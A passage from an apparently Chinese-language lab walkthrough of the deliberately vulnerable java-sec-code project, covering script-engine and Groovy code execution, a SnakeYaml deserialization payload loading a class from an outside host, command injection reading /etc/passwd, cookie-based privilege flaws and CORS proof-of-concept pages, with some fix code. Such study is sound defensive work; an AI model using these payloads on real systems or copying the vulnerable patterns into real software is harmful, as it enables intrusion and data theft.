<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import javax.script.ScriptEngine;</span><br><span class="line">import javax.script.ScriptEngineManager;</span><br><span class="line">import javax.script.ScriptException;</span><br><span class="line">public class Jsexec &#123;</span><br><span class="line">    public static void main(String[] argv) throws ScriptException &#123;</span><br><span class="line">        String str &#x3D; &quot;function test()&#123; return java.lang.Runtime&#125;;r&#x3D;test();r.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;;</span><br><span class="line">        ScriptEngineManager manager &#x3D; new ScriptEngineManager(null);</span><br><span class="line">        ScriptEngine engine &#x3D; manager.getEngineByName(&quot;js&quot;);</span><br><span class="line">        engine.eval(str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如上。可以成功弹出计算器,如果遇到关键字检测。还可以用注释和空格绕过。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827145640867.png" alt="image-20210827145640867"></p>
<p>查看Java-sec-code代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * http:&#x2F;&#x2F;localhost:8080&#x2F;rce&#x2F;jscmd?jsurl&#x3D;http:&#x2F;&#x2F;xx.yy&#x2F;zz.js</span><br><span class="line"> *</span><br><span class="line"> * curl http:&#x2F;&#x2F;xx.yy&#x2F;zz.js</span><br><span class="line"> * var a &#x3D; mainOutput(); function mainOutput() &#123; var x&#x3D;java.lang.Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);&#125;</span><br><span class="line"> *</span><br><span class="line"> * @param jsurl js url</span><br><span class="line"> *&#x2F;</span><br><span class="line">@GetMapping(&quot;&#x2F;jscmd&quot;)</span><br><span class="line">public void jsEngine(String jsurl) throws Exception&#123;</span><br><span class="line">    &#x2F;&#x2F; js nashorn javascript ecmascript</span><br><span class="line">    ScriptEngine engine &#x3D; new ScriptEngineManager().getEngineByName(&quot;js&quot;);</span><br><span class="line">    Bindings bindings &#x3D; engine.getBindings(ScriptContext.ENGINE_SCOPE);</span><br><span class="line">    String cmd &#x3D; String.format(&quot;load(\&quot;%s\&quot;)&quot;, jsurl);</span><br><span class="line">    engine.eval(cmd, bindings);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>用Python本地起一个服务器，写入JS进行触发</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827152848993.png" alt="image-20210827152848993"></p>
<h3 id="6）Yaml反序列化命令执行"><a href="#6）Yaml反序列化命令执行" class="headerlink" title="6）Yaml反序列化命令执行"></a>6）Yaml反序列化命令执行</h3><p><code>SnakeYaml</code>是用来解析yaml的格式，可以用于Java对象的序列化、反序列化。</p>
<p>核心代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;vuln&#x2F;yarm&quot;)</span><br><span class="line">public void yarm(String agrs) &#123;</span><br><span class="line">    String content &#x3D; &quot;!!javax.script.ScriptEngineManager [\n&quot; +</span><br><span class="line">            &quot; !!java.net.URLClassLoader [[\n&quot; +</span><br><span class="line">            &quot; !!java.net.URL [\&quot;http:&#x2F;&#x2F;o5s7wr.dnslog.cn\&quot;]\n&quot; +</span><br><span class="line">            &quot; ]]\n&quot; +</span><br><span class="line">            &quot;]&quot;;</span><br><span class="line">    Yaml y &#x3D; new Yaml();</span><br><span class="line">    y.load(content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进行测试</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827175118150.png" alt="image-20210827175118150"></p>
<p>使用师傅写好的利用脚本进行利用利用 <a target="_blank" rel="noopener" href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p>
<p>打开并修改代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package artsploit;</span><br><span class="line"></span><br><span class="line">import javax.script.ScriptEngine;</span><br><span class="line">import javax.script.ScriptEngineFactory;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line">public class AwesomeScriptEngineFactory implements ScriptEngineFactory &#123;</span><br><span class="line"></span><br><span class="line">    public AwesomeScriptEngineFactory() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getEngineName() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getEngineVersion() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public List&lt;String&gt; getExtensions() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public List&lt;String&gt; getMimeTypes() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public List&lt;String&gt; getNames() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getLanguageName() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getLanguageVersion() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Object getParameter(String key) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getMethodCallSyntax(String obj, String m, String... args) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getOutputStatement(String toDisplay) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getProgram(String... statements) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public ScriptEngine getScriptEngine() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>整个脚本也都比较简单，就是实现了ScriptEngineFactory接口，然后调用Runtime.getRuntime().exec执行命令。</p>
<p><a target="_blank" rel="noopener" href="https://www.pdai.tech/md/java/advanced/java-advanced-spi.html">JavaSPI机制详解</a></p>
<p>使用Python搭建简单的WEB服务后进行利用</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827180832145.png" alt="image-20210827180832145"></p>
<h3 id="7）Groovy-命令执行"><a href="#7）Groovy-命令执行" class="headerlink" title="7）Groovy 命令执行"></a>7）Groovy 命令执行</h3><p>Groovy是一种基于JVM（Java虚拟机）的敏捷开发语言，它结合了Python、Ruby和Smalltalk的许多强大的特性，Groovy 代码能够与 Java 代码很好地结合，也能用于扩展现有代码。由于其运行在 JVM 上的特性，Groovy 可以使用其他 Java 语言编写的库。</p>
<p>可以使用GroovyShell类来执行任何Groovy脚本</p>
<p>代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * http:&#x2F;&#x2F;localhost:8080&#x2F;rce&#x2F;groovy?content&#x3D;&quot;open -a Calculator&quot;.execute()</span><br><span class="line"> * @param content groovy shell</span><br><span class="line"> *&#x2F;</span><br><span class="line">@GetMapping(&quot;&#x2F;groovy&quot;)</span><br><span class="line">public void groovyshell(String content) &#123;</span><br><span class="line">    GroovyShell groovyShell &#x3D; new GroovyShell();</span><br><span class="line">    groovyShell.evaluate(content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进行利用如下：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827183410408.png" alt="image-20210827183410408"></p>
<h2 id="2-CommandInject"><a href="#2-CommandInject" class="headerlink" title="2. CommandInject"></a>2. CommandInject</h2><p>命令行直接对请求参数进行拼接，可利用特殊字符分割执行其他命令</p>
<h3 id="1-参数注入"><a href="#1-参数注入" class="headerlink" title="1.参数注入"></a>1.参数注入</h3><p>代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * http:&#x2F;&#x2F;localhost:8080&#x2F;codeinject?filepath&#x3D;&#x2F;tmp;cat &#x2F;etc&#x2F;passwd</span><br><span class="line"> *</span><br><span class="line"> * @param filepath filepath</span><br><span class="line"> * @return result</span><br><span class="line"> *&#x2F;</span><br><span class="line">@GetMapping(&quot;&#x2F;codeinject&quot;)</span><br><span class="line">public String codeInject(String filepath) throws IOException &#123;</span><br><span class="line"></span><br><span class="line">    String[] cmdList &#x3D; new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, &quot;ls -la &quot; + filepath&#125;;</span><br><span class="line">    ProcessBuilder builder &#x3D; new ProcessBuilder(cmdList);</span><br><span class="line">    builder.redirectErrorStream(true);</span><br><span class="line">    Process process &#x3D; builder.start();</span><br><span class="line">    return WebUtils.convertStreamToString(process.getInputStream());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>访问<a target="_blank" rel="noopener" href="http://localhost:8080/java_sec_code_war/codeinject?filepath=/tmp;cat%20/etc/passwd">http://localhost:8080/java_sec_code_war/codeinject?filepath=/tmp;cat%20/etc/passwd</a></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210831100839084.png" alt="image-20210831100839084"></p>
<h3 id="2-Host注入"><a href="#2-Host注入" class="headerlink" title="2.Host注入"></a>2.Host注入</h3><p>在HTTP请求的host中命令执行</p>
<p>代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * Host Injection</span><br><span class="line"> * Host: hacked by joychou;cat &#x2F;etc&#x2F;passwd</span><br><span class="line"> * http:&#x2F;&#x2F;localhost:8080&#x2F;codeinject&#x2F;host</span><br><span class="line"> *&#x2F;</span><br><span class="line">@GetMapping(&quot;&#x2F;codeinject&#x2F;host&quot;)</span><br><span class="line">public String codeInjectHost(HttpServletRequest request) throws IOException &#123;</span><br><span class="line"></span><br><span class="line">    String host &#x3D; request.getHeader(&quot;host&quot;);</span><br><span class="line">    logger.info(host);</span><br><span class="line">    String[] cmdList &#x3D; new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, &quot;curl &quot; + host&#125;;</span><br><span class="line">    ProcessBuilder builder &#x3D; new ProcessBuilder(cmdList);</span><br><span class="line">    builder.redirectErrorStream(true);</span><br><span class="line">    Process process &#x3D; builder.start();</span><br><span class="line">    return WebUtils.convertStreamToString(process.getInputStream());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>dnslog进行测试</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210831103040958.png" alt="image-20210831103040958"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210831103104271.png" alt="image-20210831103104271"></p>
<p>进行命令注入时失败：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210831111452797.png" alt="image-20210831111452797"></p>
<p>查找半天原因之后发现</p>
<blockquote>
<p>是tomcat的版本问题,tomcat7.9以上的版本,都不支持请求链接上带有特殊字符.否则会报400错误,<br> 这是因为Tomcat严格按照 RFC 3986规范进行访问解析，而 RFC3986规范定义了Url中只允许包含英文字母（a-zA-Z）、数字（0-9）、-_.~4个特殊字符以及所有保留字符(RFC3986中指定了以下字符为保留字符：! * ’ ( ) ; : @ &amp; = + $ , / ? # [ ])。</p>
</blockquote>
<p>建议大家下一个低版本进行测试～</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210831120816642.png" alt="image-20210831120816642"></p>
<h3 id="修复代码"><a href="#修复代码" class="headerlink" title="修复代码"></a>修复代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;codeinject&#x2F;sec&quot;)</span><br><span class="line">public String codeInjectSec(String filepath) throws IOException &#123;</span><br><span class="line">    String filterFilePath &#x3D; SecurityUtil.cmdFilter(filepath);</span><br><span class="line">    if (null &#x3D;&#x3D; filterFilePath) &#123;</span><br><span class="line">        return &quot;Bad boy. I got u.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    String[] cmdList &#x3D; new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, &quot;ls -la &quot; + filterFilePath&#125;;</span><br><span class="line">    ProcessBuilder builder &#x3D; new ProcessBuilder(cmdList);</span><br><span class="line">    builder.redirectErrorStream(true);</span><br><span class="line">    Process process &#x3D; builder.start();</span><br><span class="line">    return WebUtils.convertStreamToString(process.getInputStream());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>增加了一个SecurityUtil.cmdFilter()进行过滤，command+点击cmdFilter进入cmdFilter函数查看</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static String cmdFilter(String input) &#123;</span><br><span class="line">    if (!FILTER_PATTERN.matcher(input).matches()) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续跟进FILTER_PATTERN函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private static final Pattern FILTER_PATTERN &#x3D; Pattern.compile(&quot;^[a-zA-Z0-9_&#x2F;\\.-]+$&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210831142136765.png" alt="image-20210831142136765"></p>
<h2 id="3-Broken-Access-Control"><a href="#3-Broken-Access-Control" class="headerlink" title="3. Broken Access Control"></a>3. Broken Access Control</h2><p>某些应用获取用户身份信息可能会直接从cookie中直接获取明文的nick，导致越权问题。具体写法可能有<a target="_blank" rel="noopener" href="https://github.com/JoyChou93/java-sec-code/blob/master/src/main/java/org/joychou/controller/Cookies.java">Cookies代码</a>里的几种情况。</p>
<p>代码有如下几种情况：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * 某些应用获取用户身份信息可能会直接从cookie中直接获取明文的nick或者id，导致越权问题。</span><br><span class="line"> *&#x2F;</span><br><span class="line">@RestController</span><br><span class="line">@RequestMapping(&quot;&#x2F;cookie&quot;)</span><br><span class="line">public class Cookies &#123;</span><br><span class="line"></span><br><span class="line">    private static String NICK &#x3D; &quot;nick&quot;;</span><br><span class="line"></span><br><span class="line">    @GetMapping(value &#x3D; &quot;&#x2F;vuln01&quot;)</span><br><span class="line">    public String vuln01(HttpServletRequest req) &#123;</span><br><span class="line">        String nick &#x3D; WebUtils.getCookieValueByName(req, NICK); &#x2F;&#x2F; key code</span><br><span class="line">        return &quot;Cookie nick: &quot; + nick;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @GetMapping(value &#x3D; &quot;&#x2F;vuln02&quot;)</span><br><span class="line">    public String vuln02(HttpServletRequest req) &#123;</span><br><span class="line">        String nick &#x3D; null;</span><br><span class="line">        Cookie[] cookie &#x3D; req.getCookies();</span><br><span class="line"></span><br><span class="line">        if (cookie !&#x3D; null) &#123;</span><br><span class="line">            nick &#x3D; getCookie(req, NICK).getValue();  &#x2F;&#x2F; key code</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return &quot;Cookie nick: &quot; + nick;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @GetMapping(value &#x3D; &quot;&#x2F;vuln03&quot;)</span><br><span class="line">    public String vuln03(HttpServletRequest req) &#123;</span><br><span class="line">        String nick &#x3D; null;</span><br><span class="line">        Cookie cookies[] &#x3D; req.getCookies();</span><br><span class="line">        if (cookies !&#x3D; null) &#123;</span><br><span class="line">            for (Cookie cookie : cookies) &#123;</span><br><span class="line">                &#x2F;&#x2F; key code. Equals can also be equalsIgnoreCase.</span><br><span class="line">                if (NICK.equals(cookie.getName())) &#123;</span><br><span class="line">                    nick &#x3D; cookie.getValue();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;Cookie nick: &quot; + nick;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @GetMapping(value &#x3D; &quot;&#x2F;vuln04&quot;)</span><br><span class="line">    public String vuln04(HttpServletRequest req) &#123;</span><br><span class="line">        String nick &#x3D; null;</span><br><span class="line">        Cookie cookies[] &#x3D; req.getCookies();</span><br><span class="line">        if (cookies !&#x3D; null) &#123;</span><br><span class="line">            for (Cookie cookie : cookies) &#123;</span><br><span class="line">                if (cookie.getName().equalsIgnoreCase(NICK)) &#123;  &#x2F;&#x2F; key code</span><br><span class="line">                    nick &#x3D; cookie.getValue();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;Cookie nick: &quot; + nick;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @GetMapping(value &#x3D; &quot;&#x2F;vuln05&quot;)</span><br><span class="line">    public String vuln05(@CookieValue(&quot;nick&quot;) String nick) &#123;</span><br><span class="line">        return &quot;Cookie nick: &quot; + nick;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @GetMapping(value &#x3D; &quot;&#x2F;vuln06&quot;)</span><br><span class="line">    public String vuln06(@CookieValue(value &#x3D; &quot;nick&quot;) String nick) &#123;</span><br><span class="line">        return &quot;Cookie nick: &quot; + nick;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>打开<a target="_blank" rel="noopener" href="http://172.20.10.6:8080/java_sec_code_war/cookie/vuln01其中一个进行复现">http://172.20.10.6:8080/java_sec_code_war/cookie/vuln01其中一个进行复现</a></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210901161038686.png" alt="image-20210901161038686"></p>
<h2 id="4-Cors"><a href="#4-Cors" class="headerlink" title="4. Cors"></a>4. Cors</h2><p>跨域请求伪造，由于限制不严导致可以跨域请求敏感信息，一般结合XSS，CSRF等等漏洞进行攻击。</p>
<p>前端发起AJAX请求都会受到同源策略（CORS）的限制。发起AJAX请求的方法：</p>
<ul>
<li>XMLHttpRequest</li>
<li>JQuery的<code>$.ajax</code></li>
<li>Fetch</li>
</ul>
<p>前端在发起AJAX请求时，同域或者直接访问的情况下，因为没有跨域的需求，所以Request的Header中的Origin为空。此时，如果后端代码是<code>response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin)</code>，那么Response的header中不会出现<code>Access-Control-Allow-Origin</code>，因为Origin为空。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210901162616408.png" alt="image-20210901162616408"></p>
<p>在这样配置可以去访问任何服务资源</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure>

<p>可以用curl来验证</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i  $&#39;GET&#39; \</span><br><span class="line">    -H $&#39;Origin: http:&#x2F;&#x2F;www.baidu.com&#39; \</span><br><span class="line">    -b $&#39;remember-me&#x3D;YWRtaW46MTYzMTY5MTA4NTA2OTpkZWYwZTFiYjc2MmZhYzFiMzdjMDc2MzNiYjcxOGJkOQ; JSESSIONID&#x3D;2F6ED87C606984C0547455D72FE2B9EE; XSRF-TOKEN&#x3D;1536dc0b-8b8b-4955-b669-c5b9f9b4bd6d&#39; \</span><br><span class="line">    $&#39;http:&#x2F;&#x2F;172.20.10.6:8080&#x2F;java_sec_code_war&#x2F;cors&#x2F;vuln&#x2F;origin&#39;</span><br></pre></td></tr></table></figure>

<p>Java-sec-code需要cookie来利用无cooike的poc如下</p>
<p>GET：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line"> &lt;title&gt;CORS TEST&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"> &lt;div id&#x3D;&#39;output&#39;&gt;&lt;&#x2F;div&gt;</span><br><span class="line"> &lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">   var req &#x3D; new XMLHttpRequest(); </span><br><span class="line">   req.onload &#x3D; reqListener; </span><br><span class="line">   req.open(&#39;get&#39;,&#39;http:&#x2F;&#x2F;vuln.com&#x2F;xxxx&#39;,true);</span><br><span class="line">   &#x2F;&#x2F;req.setRequestHeader(&quot;Content-Type&quot;,&quot;application&#x2F;x-www-form-urlencoded;&quot;); </span><br><span class="line">   req.withCredentials &#x3D; true;</span><br><span class="line">   req.send();</span><br><span class="line">   function reqListener() &#123;</span><br><span class="line">    var output &#x3D; document.getElementById(&#39;output&#39;);</span><br><span class="line">    output.innerHTML &#x3D; &quot;URL: http:&#x2F;&#x2F;vuln.com&#x2F;xxxx&lt;br&gt;&lt;br&gt;Response:&lt;br&gt;&lt;textarea style&#x3D;&#39;width: 659px; height: 193px;&#39;&gt;&quot; + req.responseText + &quot;&lt;&#x2F;textarea&gt;&quot;;</span><br><span class="line">   &#125;;</span><br><span class="line"> &lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>



<p>POST：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;CORS TEST&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div id&#x3D;&#39;output&#39;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">    &lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">            var req &#x3D; new XMLHttpRequest();</span><br><span class="line">            var data &#x3D; &quot;userId%3Dadmin&quot;;</span><br><span class="line">            req.onload &#x3D; reqListener;</span><br><span class="line">            req.open(&#39;post&#39;,&#39;http:&#x2F;&#x2F;vuln.com&#x2F;xxxx&#39;,true);</span><br><span class="line">            req.setRequestHeader(&quot;Content-Type&quot;,&quot;xxx&quot;);</span><br><span class="line">            req.withCredentials &#x3D; true;</span><br><span class="line">            req.send(data);</span><br><span class="line">            function reqListener() &#123;</span><br><span class="line">                var output &#x3D; document.getElementById(&#39;output&#39;);</span><br><span class="line">                output.innerHTML &#x3D; &quot;URL: http:&#x2F;&#x2F;vuln.com&#x2F;xxxx&lt;br&gt;Data: userId%3Dadmin&lt;br&gt;&lt;br&gt;Response:&lt;br&gt;&lt;textarea style&#x3D;&#39;width: 659px; height: 193px;&#39;&gt;&quot; + req.responseText + &quot;&lt;&#x2F;textarea&gt;&quot;;</span><br><span class="line">            &#125;;</span><br><span class="line">    &lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>核心代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private static String info &#x3D; &quot;&#123;\&quot;name\&quot;: \&quot;JoyChou\&quot;, \&quot;phone\&quot;: \&quot;18200001111\&quot;&#125;&quot;;</span><br><span class="line"></span><br><span class="line">@GetMapping(&quot;&#x2F;vuln&#x2F;origin&quot;)</span><br><span class="line">public String vuls1(HttpServletRequest request, HttpServletResponse response) &#123;</span><br><span class="line">    String origin &#x3D; request.getHeader(&quot;origin&quot;);</span><br><span class="line">    response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin); &#x2F;&#x2F; set origin from header</span><br><span class="line">    response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;);  &#x2F;&#x2F; allow cookie</span><br><span class="line">    return info;</span><br><span class="line">&#125;</span><br><span class="line">@GetMapping(&quot;&#x2F;vuln&#x2F;setHeader&quot;)</span><br><span class="line">public String vuls2(HttpServletResponse response) &#123;</span><br><span class="line">    &#x2F;&#x2F; 后端设置Access-Control-Allow-Origin为*的情况下，跨域的时候前端如果设置withCredentials为true会异常</span><br><span class="line">    response.setHeader(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;);</span><br><span class="line">    return info;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>设置HTTP头，然后直接返回信息</p>
<p>修复方式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line">     * 重写Cors的checkOrigin校验方法</span><br><span class="line">     * 支持自定义checkOrigin，让其额外支持一级域名</span><br><span class="line">     * 代码：org&#x2F;joychou&#x2F;security&#x2F;CustomCorsProcessor</span><br><span class="line">     *&#x2F;</span><br><span class="line">    @CrossOrigin(origins &#x3D; &#123;&quot;joychou.org&quot;, &quot;http:&#x2F;&#x2F;test.joychou.me&quot;&#125;)</span><br><span class="line">    @GetMapping(&quot;&#x2F;sec&#x2F;crossOrigin&quot;)</span><br><span class="line">    public String secCrossOrigin() &#123;</span><br><span class="line">        return info;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * WebMvcConfigurer设置Cors</span><br><span class="line">     * 支持自定义checkOrigin</span><br><span class="line">     * 代码：org&#x2F;joychou&#x2F;config&#x2F;CorsConfig.java</span><br><span class="line">     *&#x2F;</span><br><span class="line">    @GetMapping(&quot;&#x2F;sec&#x2F;webMvcConfigurer&quot;)</span><br><span class="line">    public CsrfToken getCsrfToken_01(CsrfToken token) &#123;</span><br><span class="line">        return token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * spring security设置cors</span><br><span class="line">     * 不支持自定义checkOrigin，因为spring security优先于setCorsProcessor执行</span><br><span class="line">     * 代码：org&#x2F;joychou&#x2F;security&#x2F;WebSecurityConfig.java</span><br><span class="line">     *&#x2F;</span><br><span class="line">    @GetMapping(&quot;&#x2F;sec&#x2F;httpCors&quot;)</span><br><span class="line">    public CsrfToken getCsrfToken_02(CsrfToken token) &#123;</span><br><span class="line">        return token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 自定义filter设置cors</span><br><span class="line">     * 支持自定义checkOrigin</span><br><span class="line">     * 代码：org&#x2F;joychou&#x2F;filter&#x2F;OriginFilter.java</span><br><span class="line">     *&#x2F;</span><br><span class="line">    @GetMapping(&quot;&#x2F;sec&#x2F;originFilter&quot;)</span><br><span class="line">    public CsrfToken getCsrfToken_03(CsrfToken token) &#123;</span><br><span class="line">        return token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * CorsFilter设置cors。</span><br><span class="line">     * 不支持自定义checkOrigin，因为corsFilter优先于setCorsProcessor执行</span><br><span class="line">     * 代码：org&#x2F;joychou&#x2F;filter&#x2F;BaseCorsFilter.java</span><br><span class="line">     *&#x2F;</span><br><span class="line">    @RequestMapping(&quot;&#x2F;sec&#x2F;corsFilter&quot;)</span><br><span class="line">    public CsrfToken getCsrfToken_04(CsrfToken token) &#123;</span><br><span class="line">        return token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @GetMapping(&quot;&#x2F;sec&#x2F;checkOrigin&quot;)</span><br><span class="line">    public String seccode(HttpServletRequest request, HttpServletResponse response) &#123;</span><br><span class="line">        String origin &#x3D; request.getHeader(&quot;Origin&quot;);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 如果origin不为空并且origin不在白名单内，认定为不安全。</span><br><span class="line">        &#x2F;&#x2F; 如果origin为空，表示是同域过来的请求或者浏览器直接发起的请求。</span><br><span class="line">        if (origin !&#x3D; null &amp;&amp; SecurityUtil.checkURL(origin) &#x3D;&#x3D; null) &#123;</span><br><span class="line">            return &quot;Origin is not safe.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin);</span><br><span class="line">        response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;);</span><br><span class="line">        return LoginUtils.getUserInfo2JsonStr(request);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2019/08/18/CORS%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#CORS%E4%B8%8ECSRF%E7%9A%84%E5%8C%BA%E5%88%AB">Cors和CSRF的区别</a></p>
